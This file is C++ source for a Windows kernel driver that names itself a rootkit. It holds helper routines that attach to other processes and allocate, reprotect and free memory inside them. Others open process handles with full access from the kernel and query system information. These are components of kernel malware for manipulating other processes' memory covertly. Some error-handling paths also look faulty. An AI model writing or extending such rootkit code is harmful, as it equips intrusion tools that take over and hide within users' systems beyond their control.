#include "helpers.h"
#pragma warning(disable:4996)


BOOL general::FreeAllocatedMemoryADD(PEPROCESS EpDst, ULONG OldState, PVOID BufferAddress, SIZE_T BufferSize) {
	KAPC_STATE DstState = { 0 };
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	MEMORY_BASIC_INFORMATION MemoryBasic = { 0 };


	// Check for invalid paramters:
	if (EpDst == NULL || BufferAddress == NULL || BufferSize == 0) {
		return NULL;
	}


	// Query the memory area to get newer status update:
	KeStackAttachProcess(EpDst, &DstState);
	Status = ZwQueryVirtualMemory(ZwCurrentProcess(), BufferAddress, MemoryBasicInformation, &MemoryBasic, sizeof(MemoryBasic), NULL);
	if (!NT_SUCCESS(Status)) {
		KeUnstackDetachProcess(&DstState);
		return FALSE;
	}


	// Free memory if needed:
	if (MemoryBasic.AllocationBase == BufferAddress) {
		switch (MemoryBasic.State) {
		case MEM_COMMIT:
			if (!(OldState & MEM_RESERVE)) {
				Status = ZwFreeVirtualMemory(ZwCurrentProcess(), &BufferAddress, &BufferSize, MEM_RELEASE);  // Release the unused memory
			}
			else {
				Status = ZwFreeVirtualMemory(ZwCurrentProcess(), &BufferAddress, &BufferSize, MEM_DECOMMIT);  // De-commit the unused memory
			}
			KeUnstackDetachProcess(&DstState);
			if (!NT_SUCCESS(Status)) {
				return FALSE;
			}
			return TRUE;

		case MEM_RESERVE:
			if (!(OldState & MEM_RESERVE)) {
				Status = ZwFreeVirtualMemory(ZwCurrentProcess(), &BufferAddress, &BufferSize, MEM_RELEASE);  // Release the unused memory
			}
			KeUnstackDetachProcess(&DstState);
			if (!NT_SUCCESS(Status)) {
				return FALSE;
			}
			return TRUE;

		default:
			KeUnstackDetachProcess(&DstState);  // detach from the destination process
			return TRUE;
		}
	}
	else {
		KeUnstackDetachProcess(&DstState);
		return TRUE;
	}
}




PVOID general::AllocateMemoryADD(PVOID InitialAddress, SIZE_T AllocSize, KAPC_STATE* CurrState, ULONG_PTR ZeroBits) {
	MEMORY_BASIC_INFORMATION MemoryBasic = { 0 };
	PVOID AllocationAddress = NULL;
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	

	// Check for invalid paramters:
	if (InitialAddress == NULL || AllocSize == 0) {
		return NULL;
	}


	// Initial query of memory (to confirm state and other parameters):
	__try {
		ProbeForRead(InitialAddress, AllocSize, sizeof(UCHAR));
		Status = ZwQueryVirtualMemory(ZwCurrentProcess(), InitialAddress, MemoryBasicInformation, &MemoryBasic, sizeof(MemoryBasic), NULL);

		if (!NT_SUCCESS(Status)) {
			KeUnstackDetachProcess(CurrState);
			return NULL;
		}
	}

	__except (STATUS_ACCESS_VIOLATION) {
		KeUnstackDetachProcess(CurrState);
		return NULL;
	}


	// Act upon initial memory status:
	if (MemoryBasic.Protect & PAGE_NOACCESS) {
		ChangeProtectionSettingsADD(ZwCurrentProcess(), InitialAddress, (ULONG)AllocSize, PAGE_READWRITE, MemoryBasic.Protect);
	}


	// Set the initial allocation base for each memory state:
	if (MemoryBasic.State & MEM_FREE) {
		AllocationAddress = InitialAddress;
	}

	else if (MemoryBasic.State & MEM_RESERVE) {
		AllocationAddress = MemoryBasic.AllocationBase;

		// Verify region size:
		if (AllocSize > MemoryBasic.RegionSize) {
			Status = ZwFreeVirtualMemory(ZwCurrentProcess(), &MemoryBasic.AllocationBase, &MemoryBasic.RegionSize, MEM_RELEASE);
			if (!NT_SUCCESS(Status)) {
				KeUnstackDetachProcess(CurrState);
				return NULL;
			}

			Status = ZwQueryVirtualMemory(ZwCurrentProcess(), InitialAddress, MemoryBasicInformation, &MemoryBasic, sizeof(MemoryBasic), NULL);
			if (!NT_SUCCESS(Status)) {
				KeUnstackDetachProcess(CurrState);
				return NULL;
			}

			AllocationAddress = InitialAddress;
		}
	}

	else {
		Status = ZwFreeVirtualMemory(ZwCurrentProcess(), &MemoryBasic.AllocationBase, &MemoryBasic.RegionSize, MEM_RELEASE);
		if (!NT_SUCCESS(Status)) {
			KeUnstackDetachProcess(CurrState);
			return NULL;
		}

		Status = ZwQueryVirtualMemory(ZwCurrentProcess(), InitialAddress, MemoryBasicInformation, &MemoryBasic, sizeof(MemoryBasic), NULL);
		if (!NT_SUCCESS(Status)) {
			KeUnstackDetachProcess(CurrState);
			return NULL;
		}

		AllocationAddress = InitialAddress;
	}


	// Verify updated region size:
	if (AllocSize > MemoryBasic.RegionSize) {
		KeUnstackDetachProcess(CurrState);
		return NULL;
	}


	// Allocate the actual memory:
	AllocationAddress = CommitMemoryRegionsADD(ZwCurrentProcess(), AllocationAddress, AllocSize, PAGE_READWRITE, NULL, ZeroBits);
	KeUnstackDetachProcess(CurrState);
	return AllocationAddress;
}




ULONG64 general::GetHighestUserModeAddrADD() {
	UNICODE_STRING MaxUserSym;
	RtlInitUnicodeString(&MaxUserSym, L"MmHighestUserAddress");
	return (ULONG64)MmGetSystemRoutineAddress(&MaxUserSym);
}




NTSTATUS general::ExitRootkitRequestADD(PEPROCESS From, PEPROCESS To, ROOTKIT_STATUS StatusCode, NTSTATUS Status, ROOTKIT_MEMORY* RootkInst) {
	if (From != NULL) {
		ObDereferenceObject(From);
	}

	if (To != NULL) {
		ObDereferenceObject(To);
	}
	RootkInst->StatusCode = StatusCode;
	RootkInst->Status = Status;
	return Status;
}




NTSTATUS general::OpenProcessHandleADD(HANDLE* Process, USHORT PID) {
	OBJECT_ATTRIBUTES ProcessAttr = { 0 };
	CLIENT_ID ProcessCid = { 0 };
	ProcessCid.UniqueProcess = (HANDLE)PID;
	ProcessCid.UniqueThread = NULL;
	InitializeObjectAttributes(&ProcessAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
	return ZwOpenProcess(Process, PROCESS_ALL_ACCESS, &ProcessAttr, &ProcessCid);;
}




NTSTATUS general::CopyStringAfterCharADD(PUNICODE_STRING OgString, PUNICODE_STRING NewString, WCHAR Char) {
	SIZE_T AfterLength = 0;
	WCHAR* CharOcc = NULL;


	// Check for invalid paramters:
	if (OgString->Length == 0 || OgString->Buffer == NULL) {
		return STATUS_INVALID_PARAMETER;
	}


	// Find last occurance and copy string after it:
	CharOcc = wcsrchr(OgString->Buffer, Char);
	if (CharOcc == NULL) {
		NewString->Buffer = (PWCH)ExAllocatePoolWithTag(NonPagedPool, OgString->Length, 'HlCs');
		if (NewString->Buffer == NULL) {
			return STATUS_MEMORY_NOT_ALLOCATED;
		}
		NewString->Length = OgString->Length;
		NewString->MaximumLength = OgString->MaximumLength;
		RtlCopyMemory(NewString->Buffer, OgString->Buffer, OgString->Length);
		return STATUS_SUCCESS;
	}
	else {
		AfterLength = OgString->Length - ((CharOcc - OgString->Buffer + 1) * sizeof(WCHAR));  // +1 to get to the character AFTER Char
		if (AfterLength > 0){
			NewString->Buffer = (PWCH)ExAllocatePoolWithTag(NonPagedPool, AfterLength, 0x53625374);

			if (NewString->Buffer != NULL){
				NewString->Length = (USHORT)AfterLength;
				NewString->MaximumLength = (USHORT)AfterLength;
				RtlCopyMemory(NewString->Buffer, CharOcc + 1, AfterLength);
				return STATUS_SUCCESS;
			}
			else {
				return STATUS_MEMORY_NOT_ALLOCATED;
			}
		}
		else {
			return STATUS_INVALID_PARAMETER;
		}
	}
}




BOOL general::CompareUnicodeStringsADD(PUNICODE_STRING First, PUNICODE_STRING Second, USHORT CheckLength) {
	USHORT Size = First->Length;


	// Check for invalid parameters:
	if (First->Length != Second->Length || First->Buffer == NULL || Second->Buffer == NULL) {
		return FALSE;
	}


	// Compare strings:
	if (CheckLength == 0) {
		for (USHORT i = 0; i < Size / sizeof(WCHAR); i++) {
			if (First->Buffer[i] != Second->Buffer[i]) {
				return FALSE;
			}
		}
	}
	else {
		for (USHORT i = 0; i < CheckLength / sizeof(WCHAR); i++) {
			if (First->Buffer[i] != Second->Buffer[i]) {
				return FALSE;
			}
		}
	}
	return TRUE;
}




BOOL general::IsExistFromIndexADD(PUNICODE_STRING Inner, PUNICODE_STRING Outer, USHORT StartIndex) {
	// Check for invalid parameters:
	if (Inner->Length == 0 || Outer->Length == 0 || (StartIndex * sizeof(WCHAR)) + Inner->Length > Outer->Length || Inner->Buffer == NULL || Outer->Buffer == NULL) {
		return FALSE;
	}

	// Compare strings:
	for (USHORT i = 0; i < Inner->Length / sizeof(WCHAR); i++) {
		if (Inner->Buffer[i] != Outer->Buffer[i + StartIndex]) {
			return FALSE;
		}
	}
	return TRUE;
}




RKSYSTEM_INFORET requests::RequestSystemInfoADD(SYSTEM_INFORMATION_CLASS InfoType, ULONG64 Flag) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	PVOID Buffer = NULL;
	ULONG BufferSize = 0;
	ULONG ReceivedSize = 0;
	SIZE_T DefaultSize = 0;
	RKSYSTEM_INFORET SysInfoRet = { 0 };

	Status = ZwQuerySystemInformation(InfoType, Buffer, 0, &BufferSize);  // this call will return the needed size into BufferSize
	if (BufferSize == 0) {
		DefaultSize = GetExpectedInfoSizeADD(InfoType);  // If possible, try to predict the size needed for the buffer and use that as a last resort
		if (DefaultSize == 0) {
			SysInfoRet.Buffer = NULL;
			SysInfoRet.BufferSize = 0;
		}
		Buffer = ExAllocatePoolWithTag(NonPagedPool, DefaultSize, (ULONG)Flag);  // Allocate system information singular buffer
		if (Buffer == NULL) {
			SysInfoRet.Buffer = NULL;
			SysInfoRet.BufferSize = 0;
		}
		else {
			// Query with the predicted value for the buffer size:
			if (!NT_SUCCESS(ZwQuerySystemInformation(InfoType, Buffer, (ULONG)DefaultSize, &ReceivedSize)) || ReceivedSize != (ULONG)DefaultSize) {
				ExFreePool(Buffer);
				SysInfoRet.Buffer = NULL;
				SysInfoRet.BufferSize = 0;
			}
			else {
				SysInfoRet.Buffer = Buffer;
				SysInfoRet.BufferSize = DefaultSize;
			}
		}
	}
	else {
		// Allocate an inital buffer:
		Buffer = ExAllocatePoolWithTag(NonPagedPool, BufferSize, (ULONG)Flag);
		if (Buffer == NULL) {
			SysInfoRet.Buffer = NULL;
			SysInfoRet.BufferSize = 0;
		}
		else {
			// Query the required buffer size:
			Status = ZwQuerySystemInformation(InfoType, Buffer, BufferSize, &ReceivedSize);
			if (NT_SUCCESS(Status)) {
				if (ReceivedSize != BufferSize) {
					BufferSize = ReceivedSize;
				}
				SysInfoRet.BufferSize = BufferSize;
				SysInfoRet.Buffer = Buffer;
			}
			else if (Status == STATUS_INFO_LENGTH_MISMATCH) {
				ExFreePool(Buffer);
				Buffer = ExAllocatePoolWithTag(NonPagedPool, ReceivedSize, (ULONG)Flag);
				if (Buffer == NULL) {
					SysInfoRet.Buffer = NULL;
					SysInfoRet.BufferSize = 0;
				}

				// Query the required buffer size again:
				Status = ZwQuerySystemInformation(InfoType, Buffer, ReceivedSize, NULL);
				if (NT_SUCCESS(Status)) {
					SysInfoRet.BufferSize = ReceivedSize;
					SysInfoRet.Buffer = Buffer;
				}
				else {
					SysInfoRet.BufferSize = 0;
					SysInfoRet.Buffer = NULL;
					if (Buffer != NULL) {
						ExFreePool(Buffer);
					}
				}
			}
		}
	}
	return SysInfoRet;
}




SIZE_T requests::GetExpectedInfoSizeADD(SYSTEM_INFORMATION_CLASS InfoType) {
	SYSTEM_BASIC_INFORMATION SystemBasic = { 0 };
	if (!NT_SUCCESS(ZwQuerySystemInformation(SystemBasicInformation, &SystemBasic, sizeof(SystemBasic), NULL))) {
		return 0;
	}

	switch (InfoType) {
	case SystemBasicInformation: return sizeof(SYSTEM_BASIC_INFORMATION);
	case SystemPerformanceInformation: return sizeof(SYSTEM_PERFORMANCE_INFORMATION);
	case SystemRegistryQuotaInformation: return sizeof(SYSTEM_REGISTRY_QUOTA_INFORMATION);
	case SystemTimeOfDayInformation: return sizeof(SYSTEM_TIMEOFDAY_INFORMATION);
	case SystemProcessorPerformanceInformation: return sizeof(SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION) * SystemBasic.NumberOfProcessors;
	case SystemInterruptInformation: return sizeof(SYSTEM_INTERRUPT_INFORMATION) * SystemBasic.NumberOfProcessors;
	case SystemExceptionInformation: return sizeof(SYSTEM_EXCEPTION_INFORMATION);
	case SystemCodeIntegrityInformation: return sizeof(SYSTEM_CODEINTEGRITY_INFORMATION);
	case SystemProcessInformation: return 0;
	case SystemLookasideInformation: return 0;
	default: return 0;
	}
}